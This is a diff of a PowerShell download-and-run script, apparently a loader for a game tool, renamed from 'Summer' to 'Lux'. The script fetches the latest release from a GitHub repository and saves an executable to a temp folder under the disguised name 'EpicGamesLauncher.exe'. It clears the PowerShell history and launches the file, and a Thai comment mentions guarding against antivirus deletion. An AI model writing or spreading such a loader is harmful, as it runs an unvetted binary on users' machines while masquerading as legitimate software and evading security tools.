@@ -5,9 +5,9 @@ $ProgressPreference = "SilentlyContinue"
 [console]::OutputEncoding = [System.Text.Encoding]::UTF8
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-Write-Host "Checking for updates (Summer)..." -ForegroundColor Cyan
+Write-Host "Checking for updates (Lux)..." -ForegroundColor Cyan
 
-$apiUrl = "https://api.github.com/repos/GRILLYje/Fishing_Summer_Public/releases/latest"
+$apiUrl = "https://api.github.com/repos/GRILLYje/Fishing_Lux_Public/releases/latest"
 
 try {
     $releaseInfo = Invoke-RestMethod -Uri $apiUrl -Method Get
@@ -40,14 +40,13 @@ try {
 }
 
 $baseTemp = [System.IO.Path]::GetTempPath()
-$folderPath = Join-Path -Path $baseTemp -ChildPath "Summer"
+$folderPath = Join-Path -Path $baseTemp -ChildPath "Lux"
 
 if (-not (Test-Path -LiteralPath $folderPath)) {
     New-Item -ItemType Directory -Path $folderPath -Force | Out-Null
 }
 
 $tempPath = Join-Path -Path $folderPath -ChildPath "EpicGamesLauncher.exe"
-$tempZipPath = Join-Path -Path $folderPath -ChildPath "templates.zip"
 
 try {
     $processName = [System.IO.Path]::GetFileNameWithoutExtension($tempPath)
@@ -97,7 +96,7 @@ try {
     Clear-History
 } catch {}
 
-Write-Host "Launching Summer..." -ForegroundColor Green
+Write-Host "Launching Lux..." -ForegroundColor Green
 
 # เช็คว่าไฟล์ exe มีอยู่จริงไหมก่อนรัน (กันแอนตี้ไวรัสลบ)
 if (Test-Path -LiteralPath $tempPath) {
